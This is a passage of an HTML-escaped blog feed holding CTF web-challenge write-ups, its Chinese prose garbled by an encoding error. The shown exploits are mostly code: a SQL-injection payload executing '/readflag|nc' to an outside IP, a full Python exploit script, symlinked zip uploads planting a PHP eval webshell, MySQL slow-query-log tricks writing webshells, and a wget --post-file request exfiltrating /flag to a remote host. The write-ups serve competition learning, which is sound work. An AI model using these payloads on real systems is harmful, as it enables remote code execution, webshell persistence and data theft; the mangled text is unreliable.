&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">INSERT&lt;/span> &lt;span style="color:#00a8c8">INTO&lt;/span> &lt;span style="color:#111">users&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">VALUES&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;${username}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;${password}&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">ON&lt;/span> &lt;span style="color:#111">CONFLICT&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">DO&lt;/span> &lt;span style="color:#00a8c8">NOTHING&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€æ ·çš„æ€è·¯ï¼Œå…ˆé—­åˆï¼Œåœ¨æž„é€ æ­£å¸¸çš„jsè¯­å¥&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;&amp;quot;','')/*%s*/returning(1)as&amp;quot;\\'/*&amp;quot;,(1)as&amp;quot;\\'*/-(a=`child_process`)/*&amp;quot;,(2)as&amp;quot;\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*&amp;quot;,(3)as&amp;quot;\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//&amp;quot;--&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>è¿˜å¾—ç»“åˆä¸€ä¸‹å‰é¢é‚£ä¸ª16Mçš„æº¢å‡º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€åŽæ˜¯å®Œæ•´çš„expï¼Œæ¥è‡ªäºŽorangeä½¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">random&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">randint&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#75715e"># payload = &amp;#34;union&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&amp;#39;,&amp;#39;&amp;#39;)/*&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">*/returning(1)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;/*&amp;#34;,(1)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-(a=`child_process`)/*&amp;#34;,(2)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*&amp;#34;,(3)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//&amp;#34;--&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;AAAAAA&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://10.188.2.20:12345/reg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ·±è‚²è¿™ä¸ªé¢˜ä¸è¿‡æ˜¯æŠŠç™½ç›’å®¡è®¡æ¢æˆäº†é»‘ç›’ï¼Œæ€è·¯ä¸€æ¨¡ä¸€æ ·ï¼Œå°±ä¸ç»†å—¦äº†&lt;/p>
&lt;p>å‚è€ƒwpï¼š&lt;a href="https://github.com/t3hp0rP/hitconDockerfile">hitconDockerfile&lt;/a>/&lt;a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017">hitcon-ctf-2017&lt;/a>/&lt;a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/sql-so-hard">sql-so-hard&lt;/a>/ï¼ˆæœ‰è¿™ä½å¸ˆå‚…è‡ªåˆ¶çš„dockerå¯ä»¥è‡ªè¡Œå¤çŽ°ï¼‰&lt;/p>
&lt;h2 id="zipzip">ZipZip&lt;/h2>
&lt;p>é¡µé¢æºç æç¤ºï¼šå¬è¯´åŽ‹ç¼©åŒ…æ–‡ä»¶ä¹Ÿèƒ½getshellï¼›åŽ‹ç¼©åŒ…çš„ä¸€ä¸ªå¸¸è€ƒç‚¹æ˜¯è½¯é“¾æŽ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸è¿‡è„‘å­å¤ªæœ¨äº†æ²¡æƒ³åˆ°å¦‚ä½•å†™shellè¿›åŽ»ï¼Œçœ‹äº†wpä»¥åŽæ‰æ˜Žç™½&lt;/p>
&lt;p>ä¸Šä¼ zipä¹‹åŽå›žæ˜¾çš„è·¯å¾„æ˜¯/tmp/uploadsï¼Œæ˜¾ç„¶æ— æ³•æ­£å¸¸è®¿é—®ï¼›è¿™é‡Œå¯ä»¥åˆ©ç”¨è½¯é“¾æŽ¥å°†shellå†™å…¥/var/www/html&lt;/p>
&lt;p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæŒ‡å‘/var/www/html/ç›®å½•çš„è½¯é“¾æŽ¥å¹¶zipåŽ‹ç¼©ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /var/www/html/ l1
zip -ry l1.zip l1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽå»ºç«‹ä¸€ä¸ªå’Œè½¯é“¾æŽ¥åå­—ç›¸åŒçš„ç›®å½•ï¼Œåœ¨é‡Œé¢å†™shellï¼Œä¹‹åŽå°†è¿™ä¸ªåŒåçš„ç›®å½•æ•´ä¸ªzipåŽ‹ç¼©ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># å½“å‰ç›®å½•/var/www/html/&lt;/span>
mkdir l1 &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">cd&lt;/span> l1
&lt;span style="color:#111">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_GET[&amp;#39;&lt;/span>wuhu&lt;span style="color:#d88200">&amp;#39;]);?&amp;gt;&amp;#39;&lt;/span> &amp;gt; shell.php
&lt;span style="color:#111">cd&lt;/span> ../ &lt;span style="color:#75715e"># ç»§ç»­è½¬åˆ°/var/www/html/&lt;/span>
zip -r l2.zip ./*
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å³å¯å†™å…¥shell&lt;/p>
&lt;h2 id="weblog">***WebLog&lt;/h2>
&lt;p>ä¸€æ‰“å¼€å°±ä¼šä¸‹è½½ä¸€ä¸ªlogæ–‡ä»¶ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆå†…å®¹ï¼Œä¿®æ”¹getå‚æ•°ä¸º&lt;code>/?logname=logs/info/info.2021-11-12.log&lt;/code>å¯ä»¥å¾—åˆ°çœŸæ­£çš„logï¼Œå¯ä»¥çœ‹åˆ°æ˜¯javaï¼Œæˆ‘çˆ¬äº†&lt;/p>
&lt;h2 id="easysql">easysql&lt;/h2>
&lt;blockquote>
&lt;p>long_query_time&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114115940931.png" alt="image-20211114115940931">&lt;/p>
&lt;p>å¸¸ç”¨çš„selectã€å•åŒå¼•å·ã€æ‹¬å·ã€åˆ†å·ã€setã€showã€variablesã€ç­‰éƒ½æ²¡æœ‰è¿‡æ»¤ï¼Œè¯­å¥é—­åˆæ–¹å¼ä¸ºæ‹¬å·ï¼Œç™¾åå•ä¸ºæ•°æ®åº“è®°å½•è¡Œæ•°ï¼Œä½¿ç”¨&lt;code>1);{sqlinject}--+&lt;/code>å¯ä»¥é—­åˆæŸ¥è¯¢è¯­å¥+å †å æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>show variables like '%slow_query_log%'; # æŸ¥è¯¢æ…¢æ—¥å¿—è®°å½•æ˜¯å¦å¼€å¯
setglobal slow_query_log=1; # å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—
setglobal slow_query_log_file='/var/www/html/helpyou2findflag.php' # è®¾ç½®æ…¢æŸ¥è¯¢æ—¥å¿—ä½ç½®
&lt;/code>&lt;/pre>&lt;p>æ…¢æŸ¥è¯¢ï¼Œé¡¾åæ€ä¹‰æ—¶é—´é•¿çš„æŸ¥è¯¢è®°å½•ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œæˆ‘ä»¬ç›´æŽ¥æŠŠlong_query_timeçš„é»˜è®¤å€¼æ”¹æŽ‰ï¼Œç„¶åŽå†™å…¥shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">setglobal&lt;/span> &lt;span style="color:#111">long_query_time&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#ae81ff">000001&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">show&lt;/span> &lt;span style="color:#111">variables&lt;/span> &lt;span style="color:#00a8c8">like&lt;/span> &lt;span style="color:#d88200">&amp;#39;long_query_time&amp;#39;&lt;/span>&lt;span style="color:#111">l&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php $_REQUEST[a]($_REQUEST[b])?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…ç”¨benchmarkè¿™æ ·çš„å‡½æ•°å»¶é•¿æ‰§è¡Œæ—¶é—´&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">slow_query_log_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/var/www/html/helpyou2findflag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">slow_query_log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">on&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">log_queries_not_using_indexes&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">on&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x3c3f706870206576616c28245f504f53545b315d293b3f3e&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#111">mysql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">db&lt;/span> &lt;span style="color:#00a8c8">where&lt;/span> &lt;span style="color:#111">BENCHMARK&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5000000000&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">MD5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x5476556d&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flagä½äºŽ/home/rainbow/ssh.log&lt;/p>
&lt;hr>
&lt;p>æ¯”èµ›èƒ½æš´éœ²å‡ºæˆ‘å¤ªå¤šçŸ­æ¿äº†ï¼Œé—®é¢˜æŒºå¤§çš„&lt;/p>
&lt;p>é¦–å…ˆæ˜¯å®¹æ˜“æ‰‹å¿™è„šä¹±ï¼Œç¬¬äºŒæ˜¯ä»–å¦ˆçš„è·Ÿä¸ªè„‘ç˜«ä¸€æ ·æ‰¾åˆ°åŽŸé¢˜éƒ½ä¸ä¼šå˜é€šï¼Œç¬¬ä¸‰æ˜¯å°±ä¼šçžŽbbä¸ä¼šå­¦javaï¼Œç¬¬å››æ˜¯ç¼ºä¹è·Ÿé˜Ÿå‹çš„æ²Ÿé€š&lt;/p>
&lt;p>å°±å·®ä¸€é¢˜å°±è¿›çº¿ä¸‹äº†ï¼Œè¿™ä¸€é¢˜å°±æŠ˜åœ¨æˆ‘è¿™é‡Œï¼ŒçœŸæ˜¯æˆ‘å…¨è´£ï¼ŒçœŸçš„å¾ˆå¯¹ä¸èµ·å¦å¤–çš„pwnçˆ·å’Œå¯†ç çˆ·ï¼Œå¤ªä¸¢äººäº†ï¼Œæˆ‘å…ˆç£•ä¸€ä¸ªï¼Œç„¶åŽç»™è‡ªå·±ä¸¤æ‹³&lt;/p>
&lt;p>å¤ªä»–å¦ˆå¯æƒœäº†ï¼Œè‰&lt;/p></description></item><item><title>é™‡åŽŸæˆ˜ç–«CTF Wp</title><link>https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/</link><pubDate>Tue, 16 Nov 2021 14:24:03 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/16/longyuanzhanyi-ctf-wp/</guid><description>&lt;h2 id="checkin">CheckIN&lt;/h2>
&lt;p>æ˜¯ä¸ªgoçš„æ–‡ä»¶ï¼Œå‘çŽ°äº†/wgetè·¯ç”±å¯ä»¥æ‰§è¡Œwgetå‘½ä»¤ï¼ŒæŽ¥æ”¶çš„å‚æ•°å¯ä»¥æ˜¯ä¸ªæ•°ç»„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141624569.png" alt="image-20211116141624569">&lt;/p>
&lt;p>åˆ©ç”¨wgetçš„å‚æ•°å¤–å¸¦flag&lt;/p>
&lt;pre tabindex="0">&lt;code>/wget?argv=1&amp;amp;agrv=--post-file&amp;amp;argv=/flag&amp;amp;agrv=http://101.35.114.107:8426/
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116142102694.png" alt="image-20211116142102694">&lt;/p>
&lt;h2 id="eaaasyphp">eaaasyphp&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Check&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hint&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;no hint&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;phpinfo&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">hint&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__toString&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str2&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_REQUEST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__invoke&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Welcome&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">$str1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str4&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;code&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
